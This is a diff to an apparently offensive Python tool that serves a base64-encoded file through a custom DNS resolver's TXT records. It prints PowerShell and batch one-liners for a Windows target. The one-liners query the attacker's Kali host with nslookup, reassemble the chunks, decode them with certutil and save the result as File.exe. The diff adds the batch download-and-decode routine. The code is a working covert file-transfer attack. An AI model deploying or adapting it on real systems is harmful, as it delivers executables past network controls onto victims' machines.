@@ -36,11 +36,9 @@ SplitString = [encodedString[i: i + x] for i in range(0, len(encodedString), x)]
 z = 1
 if os.path.exists("ZoneFile.txt"):
   os.remove("ZoneFile.txt")
-  print("Old ZoneFile exists, removing")
-else:
-  print("The ZoneFile does not exist, creating new file")
 
 DName = ".texting.com"
+
 while z <= len(SplitString):
     fileopen = open('ZoneFile.txt', 'w')
     for chunk in SplitString:
@@ -48,12 +46,27 @@ while z <= len(SplitString):
         z += 1
     fileopen.close()
 
+print(" ")
 print("Powershell File Transfer, enter text below in powershell window, change CHANGEME_IP_KALI to IP address of Kali system")
 print(" ")
 print("del File.txt; del newFile; $c = \"\"; $i = 1; while ($i -le " + str(len(SplitString)) + "){$a = nslookup -q=txt " + "\"$i" + DName + "\" CHANGEME_IP_KALI | Select-String -Pattern '\"' | Out-String ; $b = $a.trim(); $c += $b.Replace(\"`\"\",\"\"); $i += 1}; $c.Replace(\"`n\",\"\") | Out-File -Append File.txt; certutil.exe -decode .\File.txt newFile")
-
 print(" ")
+print(" ")
+print("Batch File Transfer, enter text below in notepad.exe and save as bat file, change CHANGEME_IP_KALI to IP address of Kali system, then run")
+print(" ")
+print("@echo off")
+print("for /l %%x in (1,1," + str(len(SplitString)) + ") do nslookup -q=txt %%x" + DName + "\" CHANGEME_IP_KALI | >> File.txt findstr \\\"")
+print("setlocal EnableDelayedExpansion")
 
+
+print("for /F \"tokens=*\" %%A in (File.txt) do (\n  set line=%%A\necho(!line: =!>>newfile1.txt\n)\ndel File.txt")
+print("for /F \"delims=\" %%A in ('type \"newfile1.txt\"') do (\n  set row=%%A\nset row=!row:\"=!\necho.!row!>> \"newfile2.txt\"\n)\ndel newfile1.txt")
+
+print("certutil -decode newfile2.txt File.txt\ndel newfile2.txt")
+print("move File.txt File.exe")
+print(" ")
+print(" ")
+print("DNS Server Log Info:")
 SERIAL_NO = int((datetime.utcnow() - datetime(1970, 1, 1)).total_seconds())
 
 handler = logging.StreamHandler()
@@ -138,7 +151,7 @@ class Resolver(ProxyResolver):
 
     def load_zones(self, zone_file):
         assert zone_file.exists(), f'zone files "{zone_file}" does not exist'
-        logger.info('loading zone file "%s":', zone_file)
+        #logger.info('loading zone file "%s":', zone_file)
         zones = []
         for line in self.zone_lines():
             try:
@@ -150,7 +163,7 @@ class Resolver(ProxyResolver):
                     args = (args_,)
                 record = Record(rname, rtype, args)
                 zones.append(record)
-                logger.info(' %2d: %s', len(zones), record)
+                #logger.info(' %2d: %s', len(zones), record)
             except Exception as e:
                 raise RuntimeError(f'Error processing line ({e.__class__.__name__}: {e}) "{line.strip()}"') from e
         logger.info('%d zone resource records generated from zone file', len(zones))
